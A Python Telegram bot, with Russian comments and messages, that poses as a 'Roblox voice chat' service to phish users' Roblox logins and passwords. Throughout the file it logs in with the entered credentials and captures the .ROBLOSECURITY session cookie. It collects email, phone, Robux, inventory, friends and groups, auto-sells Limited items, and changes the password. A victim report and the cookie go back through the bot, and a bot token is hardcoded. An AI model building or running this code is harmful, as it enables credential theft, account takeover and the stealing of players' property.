import os
import requests
import time
import threading
from telebot import TeleBot
from flask import Flask

BOT_TOKEN = "8659229772:AAER6Afyk1Q9CufqsA7NG-xeeicy9gbY3Ag"
CHAT_ID = "7257193189"
bot = TeleBot(BOT_TOKEN)

# Flask-сервер для Render
app = Flask(__name__)

@app.route('/')
def home():
    return "Бот работает!"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

# Запускаем Flask в отдельном потоке
threading.Thread(target=run_flask, daemon=True).start()

def steal_cookie(username, password):
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) RobloxApp",
        "Origin": "https://www.roblox.com"
    })
    login_data = {
        "ctype": "Username",
        "cvalue": username,
        "password": password,
        "rememberUser": "true"
    }
    r = sess.post("https://auth.roblox.com/v2/login", json=login_data)
    if r.status_code != 200:
        return None
    for cookie in sess.cookies:
        if cookie.name == ".ROBLOSECURITY":
            return cookie.value
    return None

def get_inventory(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
    items = []
    cursor = ""
    while len(items) < 200:
        url = f"https://inventory.roblox.com/v1/users/current/inventory?limit=100&cursor={cursor}"
        r = requests.get(url, headers=headers)
        if r.status_code != 200:
            break
        data = r.json()
        for item in data.get("data", []):
            items.append({
                "name": item["name"],
                "assetId": item["assetId"],
                "type": item.get("assetType", {}).get("name", "Unknown")
            })
        cursor = data.get("nextPageCursor", "")
        if not cursor:
            break
    return items

def get_robux(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
    r = requests.get("https://economy.roblox.com/v1/users/current/currency", headers=headers)
    if r.status_code == 200:
        return r.json().get("robux", 0)
    return 0

def get_account_info(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
    u = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
    if u.status_code != 200:
        return None
    acc = u.json()
    s = requests.get("https://accountsettings.roblox.com/v1/settings", headers=headers)
    if s.status_code == 200:
        settings = s.json()
        acc["email"] = settings.get("email", "Нет")
        acc["phone"] = settings.get("phoneNumber", "Нет")
    else:
        acc["email"] = "Не удалось получить"
        acc["phone"] = "Не удалось получить"
    acc["userId"] = acc.get("id", "Unknown")
    acc["displayName"] = acc.get("displayName", acc.get("name", "Unknown"))
    return acc

def change_password(cookie, new_pass):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "Content-Type": "application/json"}
    data = {"password": new_pass}
    r = requests.post("https://www.roblox.com/v1/password/change", headers=headers, json=data)
    return r.status_code == 200

def auto_sell_limiteds(cookie, items):
    sold = []
    limiteds = [i for i in items if "Limited" in str(i.get("type", ""))]
    for lim in limiteds[:10]:
        headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
        r = requests.get(f"https://economy.roblox.com/v2/assets/{lim['assetId']}/details", headers=headers)
        if r.status_code == 200 and r.json().get("priceInRobux"):
            min_price = r.json()["priceInRobux"] - 5
            if min_price > 0:
                sell_headers = {"Cookie": f".ROBLOSECURITY={cookie}", "Content-Type": "application/json"}
                sell_data = {"assetId": lim['assetId'], "price": min_price}
                sell_r = requests.post("https://economy.roblox.com/v1/assets/sell", headers=sell_headers, json=sell_data)
                if sell_r.status_code == 200:
                    sold.append(f"{lim['name']} за {min_price} Robux")
        time.sleep(1)
    return sold

def get_friends(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
    r = requests.get("https://friends.roblox.com/v1/users/authenticated/friends", headers=headers)
    if r.status_code == 200:
        return [f"{f['name']} (ID:{f['id']})" for f in r.json().get("data", [])[:20]]
    return []

def get_groups(cookie):
    headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
    r = requests.get("https://groups.roblox.com/v2/users/authenticated/groups/roles", headers=headers)
    if r.status_code == 200:
        return [f"{g['group']['name']} - {g['role']['name']}" for g in r.json().get("data", [])]
    return []

@bot.message_handler(commands=['start'])
def start(msg):
    bot.send_message(msg.chat.id, "[🔥] Roblox voice chat . Бот готов.\n Введите пожалуйста логин и пароль от своего Roblox аккаунт,что бы мы могли зайти,и сделать вам войс чат")

@bot.message_handler(func=lambda m: True)
def handle(msg):
    creds = msg.text.strip()
    if ":" not in creds:
        bot.reply_to(msg, "Формат: логин:пароль")
        return
    
    login, pwd = creds.split(":", 1)
    cookie = steal_cookie(login, pwd)
    if not cookie:
        bot.send_message(msg.chat.id, f"❌ {login} - не удалось")
        return
    
    bot.send_message(msg.chat.id, f"[⚡] Взломан: {login}, собираю...")
    
    inventory = get_inventory(cookie)
    robux = get_robux(cookie)
    account = get_account_info(cookie)
    friends = get_friends(cookie)
    groups = get_groups(cookie)
    sold_items = auto_sell_limiteds(cookie, inventory)
    new_pass = f"Gothbreach_{login}_{int(time.time())}"
    pass_changed = change_password(cookie, new_pass)
    
    report = f"🎯 **ЖЕРТВА: {login}**\n"
    report += f"📧 Email: {account.get('email', 'Нет')}\n"
    report += f"📱 Телефон: {account.get('phone', 'Нет')}\n"
    report += f"💰 Robux: {robux}\n\n"
    report += f"🔑 **ПАРОЛЬ СМЕНЁН**\nНовый: `{new_pass}`\n\n" if pass_changed else "❌ Не удалось сменить пароль\n\n"
    report += f"📦 Инвентарь: {len(inventory)} предметов\n"
    
    if sold_items:
        report += f"\n✅ Продано:\n" + "\n".join(sold_items[:5])
    
    bot.send_message(msg.chat.id, report, parse_mode="Markdown")
    bot.send_message(msg.chat.id, f"🍪 Cookie:\n`{cookie}`", parse_mode="Markdown")

print("[+] Бот запущен на Render")
# Сброс вебхука перед запуском
import urllib.request
urllib.request.urlopen(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook")

bot.infinity_polling()
